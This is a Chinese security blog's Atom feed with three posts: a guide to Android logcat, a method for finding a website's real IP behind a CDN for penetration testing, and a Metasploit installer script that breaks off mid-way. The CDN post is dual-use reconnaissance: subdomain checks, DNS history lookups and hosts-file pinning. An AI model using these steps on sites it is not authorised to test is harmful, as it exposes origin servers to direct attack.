<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>凉城Lc</title>
  
  <subtitle>真正的不自由，是在自己的心中设下牢笼</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://airs-sec.com/"/>
  <updated>2018-07-18T19:01:33.135Z</updated>
  <id>http://airs-sec.com/</id>
  
  <author>
    <name>凉城Lc</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>logcat命令行工具</title>
    <link href="http://airs-sec.com/2018/07/18/logcat%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/"/>
    <id>http://airs-sec.com/2018/07/18/logcat命令行工具/</id>
    <published>2018-07-17T19:00:18.000Z</published>
    <updated>2018-07-18T19:01:33.135Z</updated>
    
    <content type="html"><![CDATA[<p>#logcat 命令行工具</p><p>@(J3-android测试工具)</p><p>Logcat 是一个命令行工具，用于转储系统消息日志，其中包括设备引发错误时的堆叠追踪以及从应用使用 Log 类编写的消息。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/minimalist-photography-black-white-grey-light-shadow-wall-negative-space.jpg" alt=" logcat命令行工具" title="logcat命令行工具"></p><a id="more"></a><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[adb] logcat [&lt;option&gt;] ... [&lt;filter-spec&gt;] ...</span><br></pre></td></tr></table></figure><p>可以使用<code>adb logcat</code>的方式运行<code>logcat</code>，也可以使用<code>adb shell</code>进入到模拟器的shell界面，直接使用<code>logcat</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat</span><br></pre></td></tr></table></figure><p><strong><code>or</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line"># logcat</span><br></pre></td></tr></table></figure><p><strong><code>logcat命令行选项</code></strong></p><table><br>   <tr><br>      <td>选项</td><br>      <td>命令行描述</td><br>   </tr><br>   <tr><br>      <td>-c</td><br>      <td>清除（刷新）整个日志并退出。</td><br>   </tr><br>   <tr><br>      <td>-d</td><br>      <td>将日志转储到屏幕并退出。</td><br>   </tr><br>   <tr><br>      <td>-f <filename></filename></td><br>      <td>将日志消息输出写入 <filename>。默认值为 stdout。</filename></td><br>   </tr><br>   <tr><br>      <td>-g</td><br>      <td>打印指定日志缓冲区的大小并退出。</td><br>   </tr><br>   <tr><br>      <td>-n <count></count></td><br>      <td>将已旋转日志的最大数量设置为 <count>。默认值为 4。 需要使用 -r 选项。</count></td><br>   </tr><br>   <tr><br>      <td>-r <kbytes></kbytes></td><br>      <td>每输出 <kbytes> 时旋转日志文件。默认值为 16。需要使用 -f 选项。</kbytes></td><br>   </tr><br>   <tr><br>      <td>-s</td><br>      <td>将默认过滤器规则设为静默式。</td><br>   </tr><br>   <tr><br>      <td>-v <format></format></td><br>      <td>设置日志消息的输出格式。默认值为 brief 格式有关支持的格式列表</td><br>   </tr><br></table><h2 id="过滤日志输出"><a href="#过滤日志输出" class="headerlink" title="过滤日志输出"></a>过滤日志输出</h2><p>每个Android日志信息都有与其关联的<code>tags</code>和<code>priority</code>。</p><ul><li><code>tags</code>：一个简短的字符串，标识日志来源于某个组件，如：”View”代表视图系统。</li><li><code>priority</code>：由以下字符标识：<ul><li>V ： 详细（最低优先级）</li><li>D：调试</li><li>I：信息</li><li>W：警告</li><li>E：错误</li><li>F：致命</li><li>S：静默（最高优先级，不打印任何内容）</li></ul></li></ul><p>一般日志输出包含了上面的所有级别的日志，为了更好的去显示并管理，我们可以使用过滤器（filter）去限制日志的输出。</p><p><code>filter</code>语法：<code>tags:priority</code></p><p><code>tag</code>：表示感兴趣的标签，如：<code>ActivityView</code><br><code>priority</code>：最低优先级，将等于或高于优先级的标记消息输出终端或指定日志文件中。</p><p>在一个过滤器表达式中，你可以提供任意数量的<code>tag:priority</code>规则，规则用空格进行隔开。</p><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat ActivityManager:I MyApp:D *:S</span><br></pre></td></tr></table></figure><p>该表达式将阻止除带有<code>ActivityManager</code>标志且优先级等于或高于信息（I）的日志以及带有标志<code>MyApp</code>且优先级高于或等于调试（D）的日志外的其他所有的日志信息。</p><p>上述表达式中最后一个元素<code>*:S</code> 将所有标记的优先级设为“静默”(S)，从而确保系统仅显示带有<code>“ActivityManager”</code>和<code>“MyApp”</code>标记的日志消息。</p><p>使用<code>*:S</code>可有效地确保日志输出受限于您已明确指定的过滤器 。它允许过滤器充当日志输出的“白名单”。</p><p>以下过滤器表达式显示所有标记上优先级等于或高于“警告”的所有日志消息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat *:W</span><br></pre></td></tr></table></figure><p>如果你以<code>adb shell logcat</code>运行<code>logcat</code>，你可以先设置环境变量<code>ANDROID_LOG_TAGS</code>的值为默认的过滤器表达式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export ANDROID_LOG_TAGS=&quot;ActivityManager:I MyApp:D *:S&quot;</span><br></pre></td></tr></table></figure><h2 id="控制日志输出格式"><a href="#控制日志输出格式" class="headerlink" title="控制日志输出格式"></a>控制日志输出格式</h2><p>除标记和优先级外，日志消息还包含许多元数据字段。您可以修改消息的输出格式，以便它们可显示特定的元数据字段。为此，您可以使用<code>-v</code>选项，并指定下面列出的支持的输出格式之一。</p><p><code>brief</code>— 显示优先级/标记以及发出消息的进程的 PID（默认格式）。<br><code>process</code> — 仅显示 PID。<br><code>tag</code> — 仅显示优先级/标记。<br><code>raw</code>— 显示原始日志消息，不显示其他元数据字段。<br><code>time</code>— 显示日期、调用时间、优先级/标记以及发出消息的进程的 PID。<br><code>threadtime</code> — 显示日期、调用时间、优先级、标记以及发出消息的线程的 PID 和 TID。<br><code>long</code>— 显示所有元数据字段，并使用空白行分隔消息。</p><p>启动 <code>logcat</code>时，您可以使用 -v 选项指定您需要的输出格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[adb] logcat [-v &lt;format&gt;]</span><br></pre></td></tr></table></figure><p>下面的例子展示如何生成 thread 输出格式的消息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat -v thread</span><br></pre></td></tr></table></figure><p><strong><code>请注意，使用 -v 选项，您只能指定一个输出格式。</code></strong></p><h2 id="查看备用日志缓冲区"><a href="#查看备用日志缓冲区" class="headerlink" title="查看备用日志缓冲区"></a>查看备用日志缓冲区</h2><p><code>Android</code>日志系统保留日志消息的多个循环缓冲区，而不是发送到默认循环缓冲区的所有日志消息。如需查看其他日志消息，您可以使用<code>-b</code>选项运行<code>logcat</code>命令，以请求查看备用循环缓冲区。您可以查看下列备用缓冲区的任意一个：</p><p><code>radio</code> — 查看包含无线装置/电话相关消息的缓冲区。<br><code>events</code>— 查看包含事件相关消息的缓冲区。<br><code>main</code> — 查看主要日志缓冲区（默认值）<br>以下是 -b 选项的用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[adb] logcat [-b &lt;buffer&gt;]</span><br></pre></td></tr></table></figure><p>以下示例展示如何查看包含无线装置和电话消息的日志缓冲区。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat -b radio</span><br></pre></td></tr></table></figure><h2 id="查看-stdout-和-stderr"><a href="#查看-stdout-和-stderr" class="headerlink" title="查看 stdout 和 stderr"></a>查看 stdout 和 stderr</h2><p>默认情况下，<code>Android</code>系统将 <code>stdout</code>和<code>stderr</code>（<code>System.out</code> 和 <code>System.err</code>）输出发送到<code>/dev/null</code>。在运行<code>Dalvik VM</code>的进程中，您可以让系统将输出的副本写入日志文件。在此情况下，系统使用日志标记 <code>stdout</code>和 <code>stderr</code>（优先级都是 I）将消息写入日志。</p><p>要通过此方式路由输出，您需要停止运行的模拟器/设备实例，然后使用 <code>shell</code>命令 <code>setprop</code>以启用输出重定向。下面是具体做法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell stop</span><br><span class="line">$ adb shell setprop log.redirect-stdio true</span><br><span class="line">$ adb shell start</span><br></pre></td></tr></table></figure><p>系统保留此设置，直至您终止模拟器/设备实例。若要在模拟器/设备实例上将此设置用作默认值，您可以在设备上向<code>/data/local.prop</code> 添加一个条目。</p><h2 id="通过代码记录日志"><a href="#通过代码记录日志" class="headerlink" title="通过代码记录日志"></a>通过代码记录日志</h2><p><code>Log 类</code>允许您在<code>logcat</code> 工具中显示的代码中创建日志条目。常用的日志记录方法包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Log.v(String, String)（详细）</span><br><span class="line">Log.d(String, String)（调试）</span><br><span class="line">Log.i(String, String)（信息）</span><br><span class="line">Log.w(String, String)（警告）</span><br><span class="line">Log.e(String, String)（错误）</span><br></pre></td></tr></table></figure><p>例如，使用以下调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log.i(&quot;MyActivity&quot;, &quot;MyClass.getView() — get item number &quot; + position);</span><br></pre></td></tr></table></figure><p><code>logcat</code>输出类似于如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I/MyActivity( 1557): MyClass.getView() — get item number 1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#logcat 命令行工具&lt;/p&gt;
&lt;p&gt;@(J3-android测试工具)&lt;/p&gt;
&lt;p&gt;Logcat 是一个命令行工具，用于转储系统消息日志，其中包括设备引发错误时的堆叠追踪以及从应用使用 Log 类编写的消息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/minimalist-photography-black-white-grey-light-shadow-wall-negative-space.jpg&quot; alt=&quot; logcat命令行工具&quot; title=&quot;logcat命令行工具&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何寻找真实ip</title>
    <link href="http://airs-sec.com/2018/07/17/%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9Eip/"/>
    <id>http://airs-sec.com/2018/07/17/如何寻找真实ip/</id>
    <published>2018-07-16T18:57:25.000Z</published>
    <updated>2018-07-18T19:01:43.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="如何寻找真实ip"><a href="#如何寻找真实ip" class="headerlink" title="如何寻找真实ip"></a>如何寻找真实ip</h1><p>@(F1-发表)</p><blockquote><p>现在很多网站，都利用cdn对网站真实ip进行隐藏，或者利用反向代理的方式，代理服务器接受来自internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。</p></blockquote><blockquote><p>在没有真实ip的情况下对网站进行渗透测试，是比较困难的。所以说，寻找真实ip就显得尤其重要了。</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/513858.jpg" alt="如何寻找真实ip" title="如何寻找真实ip"></p><a id="more"></a><p>现在有很多寻找真实ip的方式。</p><h2 id="0x01-www法"><a href="#0x01-www法" class="headerlink" title="0x01 www法"></a>0x01 www法</h2><p>有些网站在做cdn加速时，只让www（如<a href="http://www.baidu.com）的域名做cdn加速，而像baidu.com这种域名不做加速。" target="_blank" rel="noopener">www.baidu.com）的域名做cdn加速，而像baidu.com这种域名不做加速。</a></p><p><img src="http://obgutsg63.bkt.clouddn.com/12313.png" alt="p123"></p><h2 id="0x02-二级域名"><a href="#0x02-二级域名" class="headerlink" title="0x02 二级域名"></a>0x02 二级域名</h2><p>二级域名有的时候不会做加速</p><p><img src="http://obgutsg63.bkt.clouddn.com/Snipaste_2018-01-11_22-29-23.png" alt="1234"></p><h2 id="0x03-利用工具查找域名ip变化记录"><a href="#0x03-利用工具查找域名ip变化记录" class="headerlink" title="0x03 利用工具查找域名ip变化记录"></a>0x03 利用工具查找域名ip变化记录</h2><p>地址：<a href="http://viewdns.info/iphistory/" target="_blank" rel="noopener">http://viewdns.info/iphistory/</a></p><p><img src="http://obgutsg63.bkt.clouddn.com/image_7782.png" alt="12345"></p><h2 id="0x04-确认是否为真实地址"><a href="#0x04-确认是否为真实地址" class="headerlink" title="0x04 确认是否为真实地址"></a>0x04 确认是否为真实地址</h2><p>在获取到了我们认为的真实地址之后，如何进一步确认呢？我们可以通过tracert工具对路由进行跟踪。</p><p>1.修改hosts文件，将获取到的真实ip地址通过hosts文件进行本地解析，之后使用tracert工具跟踪路由。</p><p>2.在不修改hosts文件解析的时候，tracert进行路由跟踪。</p><p>3.查看两者的区别。</p><h2 id="0x05-如何利用"><a href="#0x05-如何利用" class="headerlink" title="0x05 如何利用"></a>0x05 如何利用</h2><p>修改本地的hosts文件即可，将真实ip指向目标网站</p><p>如：</p><blockquote><p>111.111.111.111         <a href="http://www.airs-sec.com" target="_blank" rel="noopener">www.airs-sec.com</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;如何寻找真实ip&quot;&gt;&lt;a href=&quot;#如何寻找真实ip&quot; class=&quot;headerlink&quot; title=&quot;如何寻找真实ip&quot;&gt;&lt;/a&gt;如何寻找真实ip&lt;/h1&gt;&lt;p&gt;@(F1-发表)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;现在很多网站，都利用cdn对网站真实ip进行隐藏，或者利用反向代理的方式，代理服务器接受来自internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;在没有真实ip的情况下对网站进行渗透测试，是比较困难的。所以说，寻找真实ip就显得尤其重要了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/513858.jpg&quot; alt=&quot;如何寻找真实ip&quot; title=&quot;如何寻找真实ip&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux安装metasploit</title>
    <link href="http://airs-sec.com/2018/07/16/linux%E5%AE%89%E8%A3%85metasploit/"/>
    <id>http://airs-sec.com/2018/07/16/linux安装metasploit/</id>
    <published>2018-07-15T18:52:05.000Z</published>
    <updated>2018-07-18T19:01:56.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux安装metasploit"><a href="#linux安装metasploit" class="headerlink" title="linux安装metasploit"></a>linux安装metasploit</h1><p>@(F1-发表)</p><blockquote><p>介绍如何在linux下安装metasploit，包括metasp连接postgresql数据库。</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/392514.jpg" alt="linux安装metasploit" title="linux安装metasploit"></p><a id="more"></a><blockquote><p>安装shell脚本如下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">print_pgp_key() &#123;</span><br><span class="line">  cat &lt;&lt;-EOF</span><br><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line">Version: GnuPG v1</span><br><span class="line"></span><br><span class="line">mQINBFDAy/0BEAC8I5bw5gLQqHKx5JCacYcXFL6AZowl3qIOTxo5yfBl8CepNpWY</span><br><span class="line">OOERvIUJb17WehhhbWOo9WjpBalDXBRtI1NvfArewOT8fLm7BdhYe8U45moBfkYi</span><br><span class="line">xFtNrPw3pdIltHQISrB8PufhliN8obQuq0rcxYV8NblvYo4gIGNjBfO1QGvBNmp7</span><br><span class="line">kBtjlAuZguScZmUTdPOwfv8fqN52X9tCv1ahQk1hg8XG9YwW0vXb5z93jkLXBb5b</span><br><span class="line">sRCnou4m9IV6vOv2HVNRyMKT7uht3z4FqflP9NkySl4daCdZgmXbf169vvLdwLrC</span><br><span class="line">lVymwAbwvuyILZv4JW1w0Kx8nWiTuK5A886882i83lxnkh1vC9jInva4/5hTrbRw</span><br><span class="line">XJb7qOyh7sxa5GOfgq1NwVfLkrvVCMystrPu18sF1ORfg1UTFcz86RYdxpmoZvk7</span><br><span class="line">EeABiLCQDZKOf0fV3U9CxLj8gXPjPY1Lu6udZUN6NG1ALJjsPkGnbpQEqEJlKNAG</span><br><span class="line">+rF+tp73TrG0PW8C/THL7fN93ET3wn5tfNu86Liui9wd8ZLuPJNEYeE6eyPAgXJ4</span><br><span class="line">p69Yb4ou5um5jWnzaVameECBZvtc4HOhy3nTEiVMDcKv/o8XxKOCLpjW1RSDirKl</span><br><span class="line">ZRIsJYPx2yuJSVMCsN5Sghp5+OCsQ+On4OFWxCskemvy97ftkv/fwUI7mQARAQAB</span><br><span class="line">tCJNZXRhc3Bsb2l0IDxtZXRhc3Bsb2l0QHJhcGlkNy5jb20+iQI9BBMBCgAnAhsD</span><br><span class="line">BQsJCAcDBRUKCQgLBRYCAwEAAh4BAheABQJXyXj4BQkMrEd3AAoJEM37X6UgB7lU</span><br><span class="line">GBAP/2h3lRymPIwJ7m3dKQ0ftphAvYarWdy1Y/KF2HYgmWeLjuzLlCWyiTG4pDjT</span><br><span class="line">R/EtAdRsXVGI8JFI2QpPrlSlOetGipcSsjwZjq2NeflrpjixmB7srT8HX0OoVCcx</span><br><span class="line">j7nxFwKs0oEd09fABO/K8ix5yNmDDv5y7jhz/hBfKTEqPXaY4btCZUw4A1tv8f1x</span><br><span class="line">w5oRtnveDbJGUhnEZwDvj88xJGtHj0yHDZMCU+mHEL3MMs7bfugDHjOBKo+OzGNc</span><br><span class="line">ZyAz1BjjRUt0CNfyTvzyPOEeKyhmxp/bA1X6BS+x5GqnbWP+fyWcL7hcrXpnwHDk</span><br><span class="line">ZYajpML6COo8ryY45Mrf/GOBErKUauQVN0DBbliRMMTmpbDv/uxYk5B8JnlXnRES</span><br><span class="line">KX4OFhOxkcCCIZLdq2uNBuatIz0fqBmLLLKavnff1NQ8/HM+elNf4k030wH+NE+p</span><br><span class="line">ipzzNDId0kVbhZzdLEN/C81JW5YIBSDUqx5HBll2FpJ029zC9QWKzkclS1GwH4Lp</span><br><span class="line">63aufnM39Gjt5VqRmfLVfg9WsOGlZfn1BFSFH9UoT4UmktKmFDQWiEl2WzbcSLDz</span><br><span class="line">At8hXxrXlNIb6SfRgjkFtjdVLsCWh9PHABrhpqy9BJ7A6dIIN1Dc8ryDmLqciKEZ</span><br><span class="line">WLTjph8NdAAXi8fLEUcU2n9QSARwqT6QwtcP/O7c6UVPEjY3uQINBFDAy/0BEAC5</span><br><span class="line">Ayq56LCeXqzf6LdlomjPNioSN9Cevi2VC/bJ4rgNWtenH6EH8F05xaXHePDuNWk9</span><br><span class="line">gTadI6Row6OPa0QvMgex4wndZTPsEUZv3dBLf+JQYMnGmut40LRvhivYDfrH+C5I</span><br><span class="line">g4CWJF19sBDopb2cPc1NlS0xoTlAfnu70T9i6ZwOJ0pL1BjSr2lnBfpP43sj9qO3</span><br><span class="line">aK17pn134xgQGIlgheoQ4svF0+Rtq7jAw5Vmn6JXhklXrgdKJ4o6s0VOQWjfiGzC</span><br><span class="line">Mxli0T+sr4WJpjtdtdCBmQRd/4CS0dzmlJvNgFeRIOBbJcwVYr+ttIQ7lbBKHkZ3</span><br><span class="line">trjf6ohLWI0iyVmJ+ba7QKUJJP9YvjiunP5arU/gskPyEuvROfnyWJAGJAoByQXX</span><br><span class="line">CZg10hysnGqww4oT0j7jdd9ZIMrf8GSxPaFennh+Wsva7raPTWBCzY5hla2cmcgG</span><br><span class="line">EaOnbjf2clAW3MyGmllQpBGIDtOK8GppE8DnVhhM49uIDTHF2AikMltjqwzd6HV9</span><br><span class="line">39VA77Imal/PKNHyOWEAdmIRgYwHx+cEjzJAQSQkd0G3PSfJLBaf/0Vo1nBav8q9</span><br><span class="line">VjgqhEFaNTzEj5Hqn6ldwKUul4Vb+AoSiz5Z1du32ul1CtcozUJTcWJL9ebZ8YbS</span><br><span class="line">qy7Ol4slSW3ukNaG6tBTqQYb9liIdvdQUG6oJhmzbwARAQABiQIlBBgBCgAPAhsM</span><br><span class="line">BQJXyXjnBQkMrEdiAAoJEM37X6UgB7lUJ9YP+gIFmDyjBdTD+pX+6z9FBb8p7SF8</span><br><span class="line">hLEpP51m1CSAfquDfaMOVRQ6d4P3N0KjPQs7uz1uqjQliyaek4jtEqMfkPdYwcvj</span><br><span class="line">8Zv17u41fAkS3BJFg3cR2+jtzF69sA/phHR+/a6MSnm/W+0YFOQHBKO6MIwC0an5</span><br><span class="line">qHzG1MBic6rb8qjZlsJowwlF06ZrSmodhulB2q2JMAqUvQd923wJtMIlur4wavpn</span><br><span class="line">iKdCYomlNcPF/UMVutUn0XuP7ca0yFXJgKJznLAFQ8g+b8aLyvodZYHjblaizkoj</span><br><span class="line">EWDN3zPTQebnP7N8wTl0+rc2F3Bmnak6+m0P/F1kYXyz3obSvQXwe3rYAkxarcg9</span><br><span class="line">5wXQRn6hN0PBb5lD05Ytx/peZrYpYFe4CYPtiL+y7sseExQhrRjpWr3FKGCKBpsr</span><br><span class="line">QkGUk3MiZ4iHVvlyKv/Z9IMYNRmVzMXUM2QAbRgYD0x4kvdXso6YR2rn8sC89c/O</span><br><span class="line">xIBK1HRwVgfRofUe9PmdeKhsBVYEQkNb8V18YP0GswrBc4cjoGqDwV64yPAotP2t</span><br><span class="line">B9QhqjJFM9xDT/wJSxKi1uzzSwQBfpD/ylsTB6/v1K3dksvQ6cVZqaBt4g2hq78r</span><br><span class="line">Eq+ZyncUD2z3eXXrlVheqJdXZXoayQFaTo4iIAc7wbraZZ6mDr6mxxFMlUqO2qxT</span><br><span class="line">h3RIcafYvaF7yUDA</span><br><span class="line">=hQKe</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br><span class="line">EOF</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_deb() &#123;</span><br><span class="line">  LIST_FILE=/etc/apt/sources.list.d/metasploit-framework.list</span><br><span class="line">  PREF_FILE=/etc/apt/preferences.d/pin-metasploit.pref</span><br><span class="line">  if [ ! -f $LIST_FILE ]; then</span><br><span class="line">    echo -n &quot;Adding metasploit-framework to your repository list..&quot;</span><br><span class="line">    echo &quot;deb $DOWNLOAD_URI/apt lucid main&quot; &gt; $LIST_FILE</span><br><span class="line">    print_pgp_key | apt-key add -</span><br><span class="line">  fi</span><br><span class="line">  if [ ! -f $PREF_FILE ]; then</span><br><span class="line">    mkdir -p /etc/apt/preferences.d/</span><br><span class="line">    cat &gt; $PREF_FILE &lt;&lt;EOF</span><br><span class="line">Package: metasploit*</span><br><span class="line">Pin: origin downloads.metasploit.com</span><br><span class="line">Pin-Priority: 1000</span><br><span class="line">EOF</span><br><span class="line">  fi</span><br><span class="line">  echo -n &quot;Updating package cache..&quot;</span><br><span class="line">  apt-get update &gt; /dev/null</span><br><span class="line">  echo &quot;OK&quot;</span><br><span class="line">  echo &quot;Checking for and installing update..&quot;</span><br><span class="line">  apt-get install -y --force-yes metasploit-framework</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_rpm() &#123;</span><br><span class="line">  echo &quot;Checking for and installing update..&quot;</span><br><span class="line">  REPO_FILE=/etc/yum.repos.d/metasploit-framework.repo</span><br><span class="line">  GPG_KEY_FILE=/etc/pki/rpm-gpg/RPM-GPG-KEY-Metasploit</span><br><span class="line">  if [ ! -f $REPO_FILE ]; then</span><br><span class="line">    echo -n &quot;Adding metasploit-framework to your repository list..&quot;</span><br><span class="line"></span><br><span class="line">    cat &gt; /etc/yum.repos.d/metasploit-framework.repo &lt;&lt;EOF</span><br><span class="line">[metasploit]</span><br><span class="line">name=Metasploit</span><br><span class="line">baseurl=$DOWNLOAD_URI/rpm</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file://$GPG_KEY_FILE</span><br><span class="line">enabled=1</span><br><span class="line">EOF</span><br><span class="line">    print_pgp_key &gt; $&#123;GPG_KEY_FILE&#125;</span><br><span class="line">  fi</span><br><span class="line">  yum install -y metasploit-framework</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_pkg()</span><br><span class="line">&#123;</span><br><span class="line">  (</span><br><span class="line">    cd ~/Downloads</span><br><span class="line"></span><br><span class="line">    echo &quot;Downloading package...&quot;</span><br><span class="line">    curl -O &quot;$DOWNLOAD_URI/osx/metasploitframework-latest.pkg&quot;</span><br><span class="line"></span><br><span class="line">    echo &quot;Checking signature...&quot;</span><br><span class="line"></span><br><span class="line">    if pkgutil --check-signature metasploitframework-latest.pkg; then</span><br><span class="line">      echo &quot;Installing package...&quot;</span><br><span class="line">      installer -pkg metasploitframework-latest.pkg -target /</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    echo &quot;Cleaning up...&quot;</span><br><span class="line">    rm -fv metasploitframework-latest.pkg</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DOWNLOAD_URI=http://downloads.metasploit.com/data/releases/metasploit-framework</span><br><span class="line">PKGTYPE=unknown</span><br><span class="line">ID=`id -u`</span><br><span class="line"></span><br><span class="line">if [ -f /etc/redhat-release ] ; then</span><br><span class="line">  PKGTYPE=rpm</span><br><span class="line">else</span><br><span class="line">  if uname -sv | grep &apos;Darwin&apos; &gt; /dev/null; then</span><br><span class="line">    PKGTYPE=pkg</span><br><span class="line">  else</span><br><span class="line">    PKGTYPE=deb</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$ID&quot; -ne 0 ]; then</span><br><span class="line">  if ! hash sudo 